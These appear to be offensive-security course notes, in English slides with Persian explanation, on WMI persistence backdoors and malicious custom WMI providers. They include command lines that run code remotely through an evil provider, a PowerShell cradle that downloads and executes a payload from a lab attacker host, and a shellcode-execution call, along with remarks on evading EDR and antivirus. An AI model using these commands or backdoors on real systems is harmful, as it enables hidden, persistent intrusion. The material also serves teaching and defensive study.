

Backdoors with WMI

· WMI provides ample opportunities to backdoor a
machine.
. Let's see custom malicious WMI providers for
backdoors using WMI.
. Registry and Event consumer backdoors will be
covered while discussing persistence.



---

# 1. چرا WMI برای Backdoor مناسب است؟

WMI یک زیرساخت مدیریتی در ویندوز است که اجازه می‌دهد:

- رویدادهای سیستم مانیتور شوند
- اسکریپت اجرا شود
- برنامه‌ها مدیریت شوند
- سیستم‌های ریموت کنترل شوند

به همین دلیل اگر کسی بتواند **یک WMI subscription مخرب ایجاد کند** می‌تواند:

- بدون فایل اضافی
- بدون سرویس جدید
- بدون Scheduled Task

یک **Backdoor مخفی** بسازد.

این نوع تکنیک‌ها معمولاً در دسته:

```
Fileless Persistence
```

قرار می‌گیرند.

---

# 2. ساختار Backdoor در WMI

یک Backdoor مبتنی بر WMI معمولاً از سه بخش تشکیل می‌شود:

### 1️⃣ Event Filter

تعریف می‌کند **چه زمانی رویداد اجرا شود**.

مثال:

- هنگام لاگین کاربر
- هنگام اجرای Process
- هنگام تغییر Registry
- هر چند دقیقه یکبار

---

### 2️⃣ Event Consumer

مشخص می‌کند **وقتی رویداد رخ داد چه کاری انجام شود**.

مثلاً:

- اجرای PowerShell
- اجرای Script
- اجرای Command

---

### 3️⃣ Binding

اتصال بین **Event Filter** و **Event Consumer**.

یعنی:

```
اگر Event رخ داد → Consumer اجرا شود
```

---

# 3. دیاگرام ساده WMI Backdoor

```
Event Filter
     │
     │ (Trigger)
     ▼
Event Consumer
     │
     │ (Action)
     ▼
Command / PowerShell / Script
```

---

# 4. مثال ساده از WMI Persistence

فرض کن بخواهیم:

```
هر بار که سیستم Boot شد یک PowerShell اجرا شود
```

ساختار آن در WMI:

### Event Filter

منتظر Boot سیستم می‌ماند.

### Event Consumer

PowerShell اجرا می‌کند.

### Binding

این دو را به هم وصل می‌کند.

---

# 5. چرا این تکنیک مخفی است؟

چند دلیل:

### 1️⃣ در Task Scheduler نیست

پس بررسی Scheduled Tasks چیزی نشان نمی‌دهد.

---

### 2️⃣ در Services نیست

هیچ سرویس جدیدی دیده نمی‌شود.

---

### 3️⃣ فایل اجرایی ممکن است وجود نداشته باشد

ممکن است فقط **PowerShell memory execution** باشد.

---

# 6. محل ذخیره WMI Objects

WMI objects معمولاً در این Namespace ذخیره می‌شوند:

```
root\subscription
```

در این namespace سه object مهم دیده می‌شود:

```
__EventFilter
CommandLineEventConsumer
__FilterToConsumerBinding
```

---

# 7. انواع Backdoor با WMI

در ادامه دوره معمولاً سه نوع بررسی می‌شود:

### 1️⃣ Event Consumer Backdoor

اجرای command هنگام رخ دادن event.

---

### 2️⃣ Registry Event Backdoor

اجرای code هنگام تغییر Registry.

---

### 3️⃣ Custom WMI Provider Backdoor

پیاده‌سازی provider مخرب برای اجرای کد.

این روش **خیلی پیشرفته‌تر** است.

---

# 8. نمونه ابزارهایی که از WMI Persistence استفاده می‌کنند

در دنیای واقعی این تکنیک در ابزارهای مختلف دیده شده:

- **PowerSploit**
- **Empire**
- **Cobalt Strike**
- **Metasploit**

---

# 9. مزیت اصلی WMI Backdoor

```
Stealth Persistence
```

یعنی:

- بدون فایل
- بدون سرویس
- بدون Task

و تشخیص آن سخت‌تر است.

---


# Backdoors - Custom WMI Provider

### Win32_LocalAdmins provider
. One of the earlier PoC evil WMI provider.
https://github.com/rzander/LocalAdmins
. Creates a class called Win32_LocalAdmins in the
root\cimv2 namespace which can be used to list
all local administrators.

### Evil Network Connection WMI Provider
https://github.com/jaredcatkinson/EvilNetCon
nectionWMIProvider

· A WMI provider which when installed
provides ability to execute PowerShell
command with SYSTEM privileges.
. Needs elevated privileges to be installed.
. PowerShell.exe is NOT used to execute the
payload.



Backdoors - Custom WMI Provider

Evil Network Connection WMI Provider
. To execute a command:

Invoke-WMIMethod -Class
Win32_NetConnection -ComputerName
192.168.13.2 -Credential opsdclabuser -
Name RunPs -ArgumentList "whoami"


Backdoors - Custom WMI Provider

Evil Network Connection WMI Provider

· To execute a PowerShell script:

Invoke-WMIMethod -Class
Win32_NetConnection -ComputerName
192.168.13.2 -Credential opsdc\labuser -
Name RunPs -ArgumentList "iex (New-Object
Net.WebClient).DownloadString('http://192.168.11.2:8080/payload.ps1"

Malicious WMI providers: Evil WMI Provider
https://github.com/subTee/EvilWMIProvider

. Execute Shellcode:
Invoke-WmiMethod -Class Win32 Evil -Name
ExecShellcode -ArgumentList @(0x90, 0x90,
0x90), $null


---

# 1. ترجمه متن

## Backdoors - Custom WMI Provider  
**بکدورها با استفاده از WMI Provider سفارشی**

---

## Win32_LocalAdmins Provider
- یکی از نمونه‌های اولیه **Proof of Concept (PoC)** برای یک **WMI Provider مخرب** است.  
- لینک پروژه:  
  https://github.com/rzander/LocalAdmins  

- این ابزار یک **کلاس جدید به نام `Win32_LocalAdmins`** در فضای نام (namespace) زیر ایجاد می‌کند:

```
root\cimv2
```

- از این کلاس می‌توان برای **نمایش تمام کاربران Administrator محلی سیستم** استفاده کرد.

---

## Evil Network Connection WMI Provider
لینک پروژه:  
https://github.com/jaredcatkinson/EvilNetConnectionWMIProvider

- یک **WMI Provider مخرب** است که پس از نصب، امکان **اجرای دستورات PowerShell با سطح دسترسی SYSTEM** را فراهم می‌کند.  
- برای نصب آن نیاز به **دسترسی Administrator (سطح بالا)** وجود دارد.  
- برای اجرای payload از **PowerShell.exe استفاده نمی‌شود** (که باعث مخفی‌تر شدن آن می‌شود).

---

# اجرای دستورات با این Provider

## اجرای یک دستور

```
Invoke-WMIMethod -Class Win32_NetConnection -ComputerName 192.168.13.2 -Credential opsdc\labuser -Name RunPs -ArgumentList "whoami"
```

معنی:

- از طریق WMI
- متد `RunPs`
- در کلاس `Win32_NetConnection`
- روی سیستم `192.168.13.2`
- با کاربر `opsdc\labuser`

دستور `whoami` اجرا می‌شود.

---

## اجرای اسکریپت PowerShell

```
Invoke-WMIMethod -Class Win32_NetConnection -ComputerName 192.168.13.2 -Credential opsdc\labuser -Name RunPs -ArgumentList "iex (New-Object Net.WebClient).DownloadString('http://192.168.11.2:8080/payload.ps1')"
```

معنی:

- یک اسکریپت PowerShell از اینترنت دانلود می‌کند.
- سپس آن را اجرا می‌کند.

در اینجا:

```
payload.ps1
```

یک **اسکریپت مخرب PowerShell** است که روی سرور مهاجم قرار دارد.

---

# Malicious WMI Providers: Evil WMI Provider

لینک پروژه:

https://github.com/subTee/EvilWMIProvider

امکان **اجرای Shellcode** را فراهم می‌کند.

مثال:

```
Invoke-WmiMethod -Class Win32_Evil -Name ExecShellcode -ArgumentList @(0x90,0x90,0x90), $null
```

در اینجا:

- کلاس `Win32_Evil`
- متد `ExecShellcode`
- آرایه‌ای از بایت‌ها به عنوان **Shellcode**

اجرا می‌شود.

---

# 2. توضیح مفهومی (مهم)

## WMI چیست؟

**WMI = Windows Management Instrumentation**

یک سیستم مدیریتی در ویندوز است که برای:

- مدیریت سیستم
- مانیتورینگ
- اجرای دستورات
- گرفتن اطلاعات سیستم

استفاده می‌شود.

ابزارهایی مثل:

- PowerShell
- WMIC
- System Center

از WMI استفاده می‌کنند.

---

# 3. WMI Provider چیست؟

**Provider** یک ماژول است که اطلاعات یا قابلیت‌هایی را به WMI اضافه می‌کند.

مثال:

| Provider | کار |
|---|---|
Win32_Process | مدیریت Processها |
Win32_Service | مدیریت سرویس‌ها |
Win32_OperatingSystem | اطلاعات سیستم |

اما مهاجم می‌تواند **Provider مخرب بسازد**.

---

# 4. چرا WMI برای Backdoor خوب است؟

مهاجمان از WMI استفاده می‌کنند چون:

### 1️⃣ بسیار مخفی است
در سیستم‌های سازمانی عادی استفاده می‌شود.

### 2️⃣ اجرای Remote دارد
می‌توان از راه دور دستور اجرا کرد.

### 3️⃣ در لاگ‌ها کمتر دیده می‌شود

### 4️⃣ Persistence ایجاد می‌کند

یعنی بعد از ریبوت سیستم هم باقی می‌ماند.

---

# 5. سناریوی حمله

یک سناریوی معمول:

1️⃣ مهاجم دسترسی Administrator می‌گیرد.

2️⃣ یک **WMI Provider مخرب نصب می‌کند**.

3️⃣ این Provider یک کلاس جدید ایجاد می‌کند مثل:

```
Win32_NetConnection
```

4️⃣ حالا مهاجم از هر جا می‌تواند دستور اجرا کند:

```
Invoke-WMIMethod
```

5️⃣ دستورات با **SYSTEM privilege** اجرا می‌شوند.

---

# 6. چرا PowerShell.exe استفاده نمی‌شود؟

در این تکنیک:

```
PowerShell.exe
```

مستقیم اجرا نمی‌شود.

در عوض:

- PowerShell Engine
- یا shellcode

مستقیم در حافظه اجرا می‌شود.

مزیت:

- دور زدن **EDR**
- دور زدن **Antivirus**
- اجرای **Fileless malware**

---

# 7. Shellcode چیست؟

Shellcode:

یک **کد باینری بسیار کوچک** است که مستقیم در حافظه اجرا می‌شود.

معمولاً برای:

- reverse shell
- privilege escalation
- دانلود malware

استفاده می‌شود.

---

# 8. چرا این تکنیک خطرناک است؟

چون:

- بسیار **Stealthy** است
- persistence قوی دارد
- detection سخت است
- بدون فایل اجرا می‌شود

---
